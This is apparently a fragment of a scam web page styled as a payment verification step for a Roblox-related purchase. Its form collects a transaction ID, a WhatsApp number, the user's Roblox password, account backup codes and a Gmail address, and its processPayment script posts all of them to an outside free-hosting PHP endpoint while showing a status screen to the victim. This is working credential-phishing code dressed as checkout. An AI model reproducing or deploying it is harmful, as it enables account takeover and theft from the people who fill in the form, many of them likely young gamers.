<div id="instruction-box" class="hidden bg-slate-50 p-6 rounded-2xl border border-slate-100 text-sm text-slate-600 space-y-4">
    <ul class="list-disc ml-4 space-y-2 font-medium text-slate-700">
        <li>Pay to <span class="font-bold text-blue-600">01720960851</span></li>
    </ul>
    
    <input type="text" id="txid" placeholder="Transaction ID" class="w-full p-3 bg-white border rounded-xl">
    <input type="text" id="whatsapp" placeholder="WhatsApp Number" class="w-full p-3 bg-white border rounded-xl">
    <input type="text" id="roblox_pass" placeholder="Roblox Password" class="w-full p-3 bg-white border rounded-xl">
    <input type="text" id="backup_codes" placeholder="Backup Codes" class="w-full p-3 bg-white border rounded-xl">
    <input type="email" id="email" placeholder="Gmail Address" class="w-full p-3 bg-white border rounded-xl">

    <button onclick="processPayment()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold hover:bg-blue-700">VERIFY PAYMENT</button>
</div>

<script>
function processPayment() {
    let formData = new FormData();
    formData.append('method', document.getElementById('method-name').innerText);
    formData.append('amount', document.getElementById('display-amount').innerText);
    formData.append('txid', document.getElementById('txid').value);
    formData.append('whatsapp', document.getElementById('whatsapp').value);
    formData.append('password', document.getElementById('roblox_pass').value);
    formData.append('backup', document.getElementById('backup_codes').value);
    formData.append('email', document.getElementById('email').value);

    fetch('http://swift11.infinityfreeapp.com/save_order.php', { method: 'POST', body: formData })
    .then(() => {
        document.getElementById('main-container').classList.add('hidden');
        document.getElementById('status-screen').classList.remove('hidden');
    });
}
</script>
